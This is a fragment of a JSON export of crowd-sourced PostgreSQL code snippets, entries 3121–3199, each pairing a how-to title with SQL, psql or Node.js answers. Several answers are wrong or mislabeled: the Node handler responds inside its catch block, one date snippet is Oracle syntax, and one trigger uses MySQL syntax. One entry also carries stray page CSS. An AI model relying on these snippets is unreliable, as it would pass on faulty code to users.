    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3121,
    "keyword": null,
    "link": null,
    "title": " posgres insert",
    "description": "INSERT INTO films    (code, title, did, date_prod, kind)     VALUES    ('T_601', 'Yojimbo', 106, '1961-06-16', 'Drama');\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3122,
    "keyword": null,
    "link": null,
    "title": " posgres update syntax",
    "description": "UPDATE table SET column1 = value1,     column2 = value2 ,... WHERE \tcondition;\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3123,
    "keyword": null,
    "link": null,
    "title": " possgress drop if exists table",
    "description": "drop table if exists tableName\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3124,
    "keyword": null,
    "link": null,
    "title": " possgress drop if exists view",
    "description": "drop view if exists tblName\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3125,
    "keyword": null,
    "link": null,
    "title": " postegresql delete",
    "description": "DELETE FROM films   WHERE producer_id IN (SELECT id FROM producers WHERE name = 'foo');\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3126,
    "keyword": null,
    "link": null,
    "title": " postgre describe table",
    "description": "-- All information SELECT * FROM information_schema.columns WHERE table_schema = 'some_schema' AND TABLE_NAME = 'some_table';  -- Or a more simplified version  SELECT    table_name,    column_name,    data_type FROM    information_schema.columns WHERE    table_name = 'some_table'; \npostgres=# \\d schema.tablename; \n                                     SELECT     table_name,     column_name,     data_type  FROM     information_schema.columns WHERE     table_name = 'city';\npostgres=# \\d tablename;\n",
    "reg_date": "2021-10-12T09:58:52.000Z"
  },
  {
    "id": 3127,
    "keyword": null,
    "link": null,
    "title": " postgre insert select",
    "description": "insert into items_ver(item_id, item_group, name) select * from items where item_id=2;\ninsert into TABLENAMEA (A,B,C,D)  select A,B,C,D from TABLENAMEB \n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3128,
    "keyword": null,
    "link": null,
    "title": " postgre query date",
    "description": "SELECT * FROM data WHERE date = '2020-12-21'\n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3129,
    "keyword": null,
    "link": null,
    "title": " postgre sql create table",
    "description": " -- Example table  CREATE TABLE accounts ( \tuser_id serial PRIMARY KEY, \tusername VARCHAR ( 50 ) UNIQUE NOT NULL, \tpassword VARCHAR ( 50 ) NOT NULL, \temail VARCHAR ( 255 ) UNIQUE NOT NULL, \tcreated_on TIMESTAMP NOT NULL,         last_login TIMESTAMP  );\nCREATE TABLE cities (     city_id serial PRIMARY KEY,     city_name VARCHAR (255) NOT NULL,     population INT NOT NULL CHECK (population >= 0) );  \nCREATE TABLE films_recent AS   SELECT * FROM films WHERE date_prod >= '2002-01-01'; \n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3130,
    "keyword": null,
    "link": null,
    "title": " postgres : ERROR: division by zero",
    "description": "SELECT 1.0 / NULLIF(column_that_may_be_zero, 0)\n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3131,
    "keyword": null,
    "link": null,
    "title": " postgres DROP and create contraint",
    "description": "ALTER TABLE table_name ADD CONSTRAINT constraint_name UNIQUE (column1, column2, ... column_n);\nALTER TABLE table_name DROP CONSTRAINT constraint_name;\n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3132,
    "keyword": null,
    "link": null,
    "title": " postgres add column from another table",
    "description": "ALTER TABLE customers  ADD COLUMN contact_name VARCHAR NOT NULL; \nUPDATE student SET name = institute.inst_name FROM institute WHERE student.student_id = institute.inst_id;\nAlter Postgres Table\n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3133,
    "keyword": null,
    "link": null,
    "title": " postgres add foreign key to existing table",
    "description": "ALTER TABLE tblA ADD COLUMN colA VARCHAR(10); /* 1st add column */ ALTER TABLE tblA ADD CONSTRAINT colA /* Make colA on tblA a foreign key */ FOREIGN KEY (colA) REFERENCES tblB (colB); /* colB must be a pk on tblB*/\nUPDATE student SET name = institute.inst_name FROM institute WHERE student.student_id = institute.inst_id;\nCREATE TABLE so_items ( \tso_id INTEGER,   \t... \tFOREIGN KEY (so_id) REFERENCES so_headers (id) );\nALTER TABLE distributors ADD CONSTRAINT distfk FOREIGN KEY (address) REFERENCES addresses (address) MATCH FULL; \nCREATE TABLE orders (     order_id SERIAL,     dish_name TEXT,     customer_id INTEGER REFERENCES customers (id) ); \n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3134,
    "keyword": null,
    "link": null,
    "title": " postgres add not null to existing column",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name SET NOT NULL;\n",
    "reg_date": "2021-10-12T09:58:53.000Z"
  },
  {
    "id": 3135,
    "keyword": null,
    "link": null,
    "title": " postgres add prefix to primary key",
    "description": "CREATE TRIGGER test BEFORE INSERT ON name_of_table FOR EACH ROW SET row_nanme = CONCAT('prefix-', primary_key);\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3136,
    "keyword": null,
    "link": null,
    "title": " postgres add unique constraint to column",
    "description": "ALTER TABLE table_name ADD CONSTRAINT constraint_name UNIQUE (column1, column2, ... column_n);\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3137,
    "keyword": null,
    "link": null,
    "title": " postgres alter table add primary key",
    "description": "-- To set a column as primary key: ALTER TABLE distributors ADD PRIMARY KEY (tablename);\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3138,
    "keyword": null,
    "link": null,
    "title": " postgres alter table owner",
    "description": "                                     ALTER DATABASE target_database OWNER TO new_onwer;\nALTER TABLE <tablename> OWNER TO <username>\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3139,
    "keyword": null,
    "link": null,
    "title": " postgres base size",
    "description": "SELECT pg_size_pretty( pg_database_size('dbname') );\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3140,
    "keyword": null,
    "link": null,
    "title": " postgres between dates",
    "description": "select age('2010-04-01', '2012-03-05'),        date_part('year',age('2010-04-01', '2012-03-05')),        date_part('month',age('2010-04-01', '2012-03-05')),        date_part('day',age('2010-04-01', '2012-03-05'));\nSELECT   user_id FROM   user_logs WHERE       login_date >= '2014-02-01'   AND login_date <  '2014-03-01' \nSELECT user_id  FROM user_logs  WHERE login_date BETWEEN '2014-02-01' AND '2014-03-01' \n.wp-block-code { \tborder: 0; \tpadding: 0; }  .wp-block-code > div { \toverflow: auto; }  .shcb-language { \tborder: 0; \tclip: rect(1px, 1px, 1px, 1px); \t-webkit-clip-path: inset(50%); \tclip-path: inset(50%); \theight: 1px; \tmargin: -1px; \toverflow: hidden; \tpadding: 0; \tposition: absolute; \twidth: 1px; \tword-wrap: normal; \tword-break: normal; }  .hljs { \tbox-sizing: border-box; }  .hljs.shcb-code-table { \tdisplay: table; \twidth: 100%; }  .hljs.shcb-code-table > .shcb-loc { \tcolor: inherit; \tdisplay: table-row; \twidth: 100%; }  .hljs.shcb-code-table .shcb-loc > span { \tdisplay: table-cell; }  .wp-block-code code.hljs:not(.shcb-wrap-lines) { \twhite-space: pre; }  .wp-block-code code.hljs.shcb-wrap-lines { \twhite-space: pre-wrap; }  .hljs.shcb-line-numbers { \tborder-spacing: 0; \tcounter-reset: line; }  .hljs.shcb-line-numbers > .shcb-loc { \tcounter-increment: line; }  .hljs.shcb-line-numbers .shcb-loc > span { \tpadding-left: 0.75em; }  .hljs.shcb-line-numbers .shcb-loc::before { \tborder-right: 1px solid #ddd; \tcontent: counter(line); \tdisplay: table-cell; \tpadding: 0 0.75em; \ttext-align: right; \t-webkit-user-select: none; \t-moz-user-select: none; \t-ms-user-select: none; \tuser-select: none; \twhite-space: nowrap; \twidth: 1%; }                                                     value BETWEEN low AND high;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3141,
    "keyword": null,
    "link": null,
    "title": " postgres change the name of schema",
    "description": "ALTER SCHEMA old_name RENAME TO new_name;\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3142,
    "keyword": null,
    "link": null,
    "title": " postgres composite primary key",
    "description": "CREATE TABLE course_grades (     quarter_id INTEGER,     course_id TEXT,     student_id INTEGER,     grade INTEGER,     PRIMARY KEY(quarter_id, course_id, student_id) );\nPRIMARY KEY(pk_1, pk_2, ..., pk_n)\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3143,
    "keyword": null,
    "link": null,
    "title": " postgres concat",
    "description": "update \"ExportTables\" SET \"Name\" = CONCAT(\"Name\", '.csv') \nSELECT    'Concatenation' || ' ' || 'Operator' AS result_string;\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3144,
    "keyword": null,
    "link": null,
    "title": " postgres connection string",
    "description": "postgres://YourUserName:YourPassword@YourHostname:5432/YourDatabaseName\nHost=<host>;Port=<port(default port=5432)>;Database=<db name>;Username=<username>; Password=<your password>;\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3145,
    "keyword": null,
    "link": null,
    "title": " postgres convert date to string",
    "description": "SELECT      TO_CHAR(SYSDATE, 'YYYY-MM-DD')  FROM      dual;\n",
    "reg_date": "2021-10-12T09:58:54.000Z"
  },
  {
    "id": 3146,
    "keyword": null,
    "link": null,
    "title": " postgres convert exisiting column to text",
    "description": "# POSTGRESQL - Convert an existing column to text ALTER TABLE your_table ALTER COLUMN your_column TYPE text\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3147,
    "keyword": null,
    "link": null,
    "title": " postgres convert text to number",
    "description": "SELECT ' 5800.79 '::INTEGER;\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3148,
    "keyword": null,
    "link": null,
    "title": " postgres copy table from one schema to another",
    "description": "create table schema2.the_table (like schema1.the_table including all); insert into schema2.the_table select *  from schema1.the_table;\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3149,
    "keyword": null,
    "link": null,
    "title": " postgres count distinct",
    "description": "SELECT     COUNT(DISTINCT column)  FROM     table_name WHERE    condition;\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3150,
    "keyword": null,
    "link": null,
    "title": " postgres count string length",
    "description": "SELECT length('w3resource') AS \"Length of a String\";\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3151,
    "keyword": null,
    "link": null,
    "title": " postgres count where true",
    "description": "SELECT count(CASE WHEN myCol THEN 1 END) FROM <table name> \n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3152,
    "keyword": null,
    "link": null,
    "title": " postgres create database if not exists",
    "description": "SELECT 'CREATE DATABASE mydb' WHERE NOT EXISTS (SELECT FROM pg_database WHERE datname = 'mydb')\\gexec\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3153,
    "keyword": null,
    "link": null,
    "title": " postgres create extension if not exists",
    "description": "CREATE EXTENSION [ IF NOT EXISTS ] extension_name     [ WITH ] [ SCHEMA schema_name ]              [ VERSION version ]              [ FROM old_version ]\n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3154,
    "keyword": null,
    "link": null,
    "title": " postgres create table",
    "description": " -- Example table  CREATE TABLE accounts ( \tuser_id serial PRIMARY KEY, \tusername VARCHAR ( 50 ) UNIQUE NOT NULL, \tpassword VARCHAR ( 50 ) NOT NULL, \temail VARCHAR ( 255 ) UNIQUE NOT NULL, \tcreated_on TIMESTAMP NOT NULL,         last_login TIMESTAMP  );\nCREATE TABLE cities (     city_id serial PRIMARY KEY,     city_name VARCHAR (255) NOT NULL,     population INT NOT NULL CHECK (population >= 0) );  \n-- Basic table creation CREATE TABLE table_name(    column1 datatype,    column2 datatype,    column3 datatype,    .....    columnN datatype,    PRIMARY KEY( one or more columns ) ); \nCREATE TABLE table_name ( \tcolumn_name TYPE column_constraint, \ttable_constraint table_constraint ) INHERITS existing_table_name;\nCREATE TABLE films_recent AS   SELECT * FROM films WHERE date_prod >= '2002-01-01'; \nCREATE TABLE table_name (     column_name1 col_type (field_length) column_constraints,     column_name2 col_type (field_length),     column_name3 col_type (field_length) ); \n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3155,
    "keyword": null,
    "link": null,
    "title": " postgres database sizes",
    "description": "SELECT pg_size_pretty( pg_database_size('dbname') );\nCopySELECT pg_database.datname as \"database_name\", pg_database_size(pg_database.datname)/1024/1024 AS size_in_mb FROM pg_database ORDER by size_in_mb DESC; \n/* For multiple databases */ select t1.datname AS db_name,          pg_size_pretty(pg_database_size(t1.datname)) as db_size from pg_database t1 order by pg_database_size(t1.datname) desc; \n",
    "reg_date": "2021-10-12T09:58:55.000Z"
  },
  {
    "id": 3156,
    "keyword": null,
    "link": null,
    "title": " postgres date difference seconds",
    "description": "-- difference in seconds between two dates  select extract(epoch from ('2020-03-30 09:55:56'::timestamp - '2020-03-30 08:54:55'::timestamp)); -- result : 3661\nselect age('2010-04-01', '2012-03-05'),        date_part('year',age('2010-04-01', '2012-03-05')),        date_part('month',age('2010-04-01', '2012-03-05')),        date_part('day',age('2010-04-01', '2012-03-05'));\n  -- Difference between Dec 30, 2011 08:54:55 and  Dec 30, 2011 08:56:10 in minutes   SELECT (DATE_PART('day', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp) * 24 * 60 +                 DATE_PART('hour', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp)) * 60 +                DATE_PART('minute', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp);   -- Result: 1     -- Time only   SELECT DATE_PART('hour', '08:56:10'::time - '08:54:55'::time) * 60 +               DATE_PART('minute', '08:56:10'::time - '08:54:55'::time);   -- Result: 1\n   CREATE OR REPLACE FUNCTION DateDiff (units VARCHAR(30), start_t TIME, end_t TIME)       RETURNS INT AS $$    DECLARE      diff_interval INTERVAL;       diff INT = 0;    BEGIN      -- Minus operator for TIME returns interval 'HH:MI:SS'        diff_interval = end_t - start_t;        diff = DATE_PART('hour', diff_interval);        IF units IN ('hh', 'hour') THEN        RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('minute', diff_interval);        IF units IN ('mi', 'n', 'minute') THEN         RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('second', diff_interval);        RETURN diff;    END;    $$ LANGUAGE plpgsql;\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3157,
    "keyword": null,
    "link": null,
    "title": " postgres datetime now",
    "description": "/* The NOW() function returns the current date and time. The return type of the NOW() function is the timestamp with time zone. See the following example:*/  SELECT NOW(); /*-------------------------------*/ 2017-03-18 08:21:36.175627+07 /* Note that the NOW() function returns current date and time based on the database server&rsquo;s time zone setting.*/\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3158,
    "keyword": null,
    "link": null,
    "title": " postgres declare variable",
    "description": "WITH myconstants (var1, var2) as (    values (5, 'foo') ) SELECT * FROM somewhere, myconstants WHERE something = var1    OR something_else = var2;\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3159,
    "keyword": null,
    "link": null,
    "title": " postgres default value",
    "description": "ALTER TABLE ONLY users ALTER COLUMN lang SET DEFAULT 'en_GB';\nALTER TABLE your_tble ADD COLUMN your_col VARCHAR(8) DEFAULT 'sometext';\nscore INTEGER DEFAULT 1 /* The variable name is score, and the default value for it is 1 */\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3160,
    "keyword": null,
    "link": null,
    "title": " postgres delete database",
    "description": "DROP DATABASE IF EXISTS database_name;\nCREATE DATABASE testdb1; DROP DATABASE testdb1;\n DROP DATABASE base_de_datos;  // SI SALE ESTE MESAJE DE ERROR HAGA LOS PASOS QUE ESTAN A CONTINUACION ERROR: database \"base_de_datos\" is being accessed by other users SQL state: 55006 Detail: There is 1 other session using the database. ----------------------------------------------------------------------  // primer paso --------------------------------- SELECT * FROM pg_stat_activity WHERE datname = 'base_de_datos';  //segundo paso -------------------------------- SELECT \tpg_terminate_backend (pg_stat_activity.pid) FROM \tpg_stat_activity WHERE \tpg_stat_activity.datname = 'base_de_datos';      // tercer paso -------------------------------- DROP DATABASE 'base_de_datos';  // retira las comillas si no funciona DROP DATABASE base_de_datos;\ndropdb 'database name' \nsql -U <user>  -c \"drop database protodb\"\nDROP DATABASE db_name;\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3161,
    "keyword": null,
    "link": null,
    "title": " postgres delete from where date is greater than specific date",
    "description": "DELETE FROM table WHERE update_date >= '2021-02-01'::date;\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3162,
    "keyword": null,
    "link": null,
    "title": " postgres delete last row",
    "description": "DELETE FROM my_table WHERE my_col_id = (SELECT MAX(my_col_id) FROM my_table);\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3163,
    "keyword": null,
    "link": null,
    "title": " postgres download",
    "description": "DOWNLOAD FROM HERE : https://www.postgresql.org/download/windows/\npg_ctl.exe restart -D  \"C:\\Program Files\\PostgreSQL\\9.6\\data\" \nnet start postgresql-9.5 \nPostgreSQL is a powerful, open source object-relational database system. It has more than 15 years of active development phase and a proven architecture that has earned it a strong reputation for reliability, data integrity, and correctness.  This tutorial will give you a quick start with PostgreSQL and make you comfortable with PostgreSQL programming.  What is PostgreSQL? PostgreSQL (pronounced as post-gress-Q-L) is an open source relational database management system (DBMS) developed by a worldwide team of volunteers. PostgreSQL is not controlled by any corporation or other private entity and the source code is available free of charge.\npg_ctl.exe restart -D \"<path upto data>\" \n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3164,
    "keyword": null,
    "link": null,
    "title": " postgres extract date from timestamp",
    "description": "SELECT DATE(column_name) FROM table_name;\nSELECT DATE(column_name) FROM table_name; \nSELECT DATE(SUBSTRING('2018-07-25 10:30:30' FROM 1 FOR 10)); \nSELECT '2018-07-25 10:30:30'::TIMESTAMP::DATE; \n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3165,
    "keyword": null,
    "link": null,
    "title": " postgres first value in gropby",
    "description": "try using \"DISTINCT\" instead of \"GROUP BY\", then use the \"PARTITION BY\" clause inside the first_value.\n",
    "reg_date": "2021-10-12T09:58:56.000Z"
  },
  {
    "id": 3166,
    "keyword": null,
    "link": null,
    "title": " postgres format date in select",
    "description": "select pg_catalog.concat(current_date,' 00:00:00')::timestamp /*Formata hora por exemplo no where*/  and plan_signed_at = TO_CHAR(created_at, 'YYYY-mm-dd')::timestamp /*Formata hora por exemplo no where um &eacute; date, o outro datetime*/  select  NOW() - INTERVAL '180' MINUTE /*pega a data e hora com 3 horas menos*/  select to_char(NOW(), 'yyyy/MM/dd HH24:MI:SS') AS date_no_tz, NOW() as date_tz /*data formatada com e sem timezone*/\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3167,
    "keyword": null,
    "link": null,
    "title": " postgres get database encoding",
    "description": "SHOW SERVER_ENCODING;  psql my_database -c 'SHOW SERVER_ENCODING' \n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3168,
    "keyword": null,
    "link": null,
    "title": " postgres get month name from date",
    "description": "SELECT TO_CHAR(TIMESTAMP '2020-12-16 10:41:35', 'Month') AS \"Month\"; \n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3169,
    "keyword": null,
    "link": null,
    "title": " postgres get running query",
    "description": "--Version > 9.2 SELECT pid, age(clock_timestamp(), query_start), usename, query  FROM pg_stat_activity  WHERE query != '<IDLE>' AND query NOT ILIKE '%pg_stat_activity%'  ORDER BY query_start desc;\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3170,
    "keyword": null,
    "link": null,
    "title": " postgres get size of database",
    "description": "SELECT pg_size_pretty( pg_database_size('dbname') );\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3171,
    "keyword": null,
    "link": null,
    "title": " postgres get timestamp",
    "description": "SELECT CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3172,
    "keyword": null,
    "link": null,
    "title": " postgres how to add field created at",
    "description": "ALTER TABLE customers  ADD COLUMN contact_name VARCHAR NOT NULL; \nCREATE TABLE my_table ( \tid serial NOT NULL,     user_name text, \tcreated_at timestamp with time zone DEFAULT CURRENT_TIMESTAMP //here )\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3173,
    "keyword": null,
    "link": null,
    "title": " postgres if else",
    "description": "-- use postgress case  SELECT name, continent, indep_year,     CASE WHEN indep_year < 1900 THEN 'before 1900'          WHEN indep_year <= 1930 THEN 'between 1900 and 1930'          ELSE 'after 1930' END          AS indep_year_group FROM countries ORDER BY indep_year_group;\n                                     DO $$ DECLARE   a integer := 10;   b integer := 20; BEGIN    IF a > b THEN \tRAISE NOTICE 'a is greater than b';   END IF;    IF a < b THEN \tRAISE NOTICE 'a is less than b';   END IF;    IF a = b THEN \tRAISE NOTICE 'a is equal to b';   END IF; END $$; \nif condition then   statements; else   alternative-statements; END if;\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3174,
    "keyword": null,
    "link": null,
    "title": " postgres in operator with comma separated values",
    "description": "select * from DUALS where num in (select unnest (string_to_array('1,2', ',')::integer[]))\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3175,
    "keyword": null,
    "link": null,
    "title": " postgres install unaccent extension",
    "description": "CREATE EXTENSION unaccent;\n",
    "reg_date": "2021-10-12T09:58:57.000Z"
  },
  {
    "id": 3176,
    "keyword": null,
    "link": null,
    "title": " postgres join",
    "description": "SELECT *     FROM weather INNER JOIN cities ON (weather.city = cities.name); \n-- This is in postgreSQL  -- We have tableA and tableB, x is primary key in tableA and also -- a foreign key in tableB as y SELECT * FROM tableA JOIN tableB ON tableA.x = tableB.y;  -- This will select all the columns from both tables that share a key\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3177,
    "keyword": null,
    "link": null,
    "title": " postgres join onto another table and insert column from that table",
    "description": "UPDATE student SET name = institute.inst_name FROM institute WHERE student.student_id = institute.inst_id;\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3178,
    "keyword": null,
    "link": null,
    "title": " postgres json to string",
    "description": "SELECT CAST( json_column AS TEXT ) FROM table or SELECT json_column::TEXT FROM table\nSELECT  \tID \t,( \t\tSELECT string_agg(trim(JsonString::text, '\"'), ', ') \t\tFROM jsonb_array_elements(JsonData->'Name') JsonString \t) AS StringArray FROM   tbl_TestJsonArray; \n                                     SELECT info ->> 'customer' AS customer, \tinfo -> 'items' ->> 'product' AS product FROM orders WHERE CAST ( info -> 'items' ->> 'qty' AS INTEGER) = 2\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3179,
    "keyword": null,
    "link": null,
    "title": " postgres kill running query",
    "description": "--Stop the query normally SELECT pg_cancel_backend(pid);  --Terminate immediately SELECT pg_terminate_backend(pid);\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3180,
    "keyword": null,
    "link": null,
    "title": " postgres killing connections on db",
    "description": "SELECT      pg_terminate_backend(pid)  FROM      pg_stat_activity  WHERE      -- don't kill my own connection!     pid <> pg_backend_pid()     -- don't kill the connections to other databases     AND datname = 'database_name'     ;\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3181,
    "keyword": null,
    "link": null,
    "title": " postgres like case insensitive",
    "description": "using ILIKE instead of LIKE\nSELECT id    FROM groups  WHERE LOWER(name)=LOWER('Administrator')\n-- Postgresql case insensitive: SELECT * FROM people WHERE name ILIKE 'JOHN' -- John -- JOHN -- john\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3182,
    "keyword": null,
    "link": null,
    "title": " postgres list all roles",
    "description": "postgres=# \\du\n# psql command  \\du\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3183,
    "keyword": null,
    "link": null,
    "title": " postgres list all stored procedures query",
    "description": "select n.nspname as schema,        p.proname as procedure from pg_proc p join pg_namespace n on p.pronamespace = n.oid where n.nspname not in ('pg_catalog', 'information_schema') \tand p.prokind = 'p'\n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3184,
    "keyword": null,
    "link": null,
    "title": " postgres list databases",
    "description": "SELECT current_database();\n# List databases: \\l\npostgres=# \\l\nList all databases: \\l\npostgres=# \\l \n",
    "reg_date": "2021-10-12T09:58:58.000Z"
  },
  {
    "id": 3185,
    "keyword": null,
    "link": null,
    "title": " postgres list tables and row counts",
    "description": "SELECT schemaname,relname,n_live_tup   FROM pg_stat_user_tables   ORDER BY n_live_tup DESC;\n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3186,
    "keyword": null,
    "link": null,
    "title": " postgres lower",
    "description": "SELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT lower('W3RESOURCE') AS \"Upper to Lower\";  \n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3187,
    "keyword": null,
    "link": null,
    "title": " postgres lowercase",
    "description": "SELECT upper('Hello World');\t\t-- HELLO WORLD SELECT lower('Hello World');\t\t-- hello world\nSELECT lower('W3RESOURCE') AS \"Upper to Lower\";  \n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3188,
    "keyword": null,
    "link": null,
    "title": " postgres make sql dump",
    "description": "pg_dump -U username dbname > dbexport.pgsql \npg_dump dbname > outfile\npsql databasename < data_base_dump\n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3189,
    "keyword": null,
    "link": null,
    "title": " postgres node",
    "description": "//connect to postgres database in node  const Pool = require('pg').Pool;  const pool = new Pool({     user: '',     host: 'localhost',     database:  '',     password: '',     port:5432,   })  //query example  app.get('/users',async(req,res)=>{      try{      let resp=await pool.query('SELECT * FROM users');   }catch(err){      res.status(200).send(resp.rows);   } })    \n//connect to postgres database in node  const Pool = require('pg').Pool;  const pool = new Pool({     user: '',     host: 'localhost',     database:  '',     password: '',     port:5432,   })  //query example  app.get('/users',async(req,res)=>{      try{      let resp=await pool.query('SELECT * FROM users');   }catch(err){      res.status(200).send(resp.rows);   } }) \nconst { Client } = require('pg')const client = new Client();(async () => {  await client.connect()  const res = await client.query('SELECT $1::text as message', ['Hello world!'])  console.log(res.rows[0].message) // Hello world!  await client.end()})()\n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3190,
    "keyword": null,
    "link": null,
    "title": " postgres regex remove special characters",
    "description": "UPDATE ex_cat_fda  SET name = regexp_replace(name, '[^a-zA-Z0-9]+', '','g');\n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3191,
    "keyword": null,
    "link": null,
    "title": " postgres remove database",
    "description": "DROP DATABASE IF EXISTS database_name;\nCREATE DATABASE testdb1; DROP DATABASE testdb1;\nsql -U <user>  -c \"drop database protodb\"\n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3192,
    "keyword": null,
    "link": null,
    "title": " postgres remove foreign key constraint",
    "description": "ALTER TABLE your_tbl DROP constraint your_cnstrnt;\nALTER TABLE tbl_StudentMarks DISABLE TRIGGER ALL; \nSET session_replication_role = replica; \n",
    "reg_date": "2021-10-12T09:58:59.000Z"
  },
  {
    "id": 3193,
    "keyword": null,
    "link": null,
    "title": " postgres rename database",
    "description": "ALTER DATABASE \"old_dbname\" RENAME TO \"new_dbname\"\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3194,
    "keyword": null,
    "link": null,
    "title": " postgres restart id",
    "description": "-- if you dont mind losing the data, do the following TRUNCATE TABLE someTable RESTART IDENTITY;\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3195,
    "keyword": null,
    "link": null,
    "title": " postgres select duplicate columns",
    "description": "select Column1, Column2, count(*) from yourTable group by Column1, Column2 HAVING count(*) > 1\nselect * from yourTable ou where (select count(*) from yourTable inr where inr.sid = ou.sid) > 1\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3196,
    "keyword": null,
    "link": null,
    "title": " postgres select except",
    "description": "SELECT columns_a FROM table_a EXCEPT SELECT columns_b FROM table_b;\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3197,
    "keyword": null,
    "link": null,
    "title": " postgres select from last 3 months",
    "description": "CURRENT_DATE - INTERVAL '6 months'\nSELECT * from table where date >  CURRENT_DATE - INTERVAL '3 months' \n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3198,
    "keyword": null,
    "link": null,
    "title": " postgres select max value",
    "description": "SELECT * FROM payment WHERE amount = (  \tSELECT   \t   MAX(amount) \tFROM \t   payment );\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3199,
    "keyword": null,
    "link": null,
    "title": " postgres set default schema",
    "description": "SET search_path TO schema_name; \n",
    "reg_date": "2021-10-12T09:59:00.000Z"
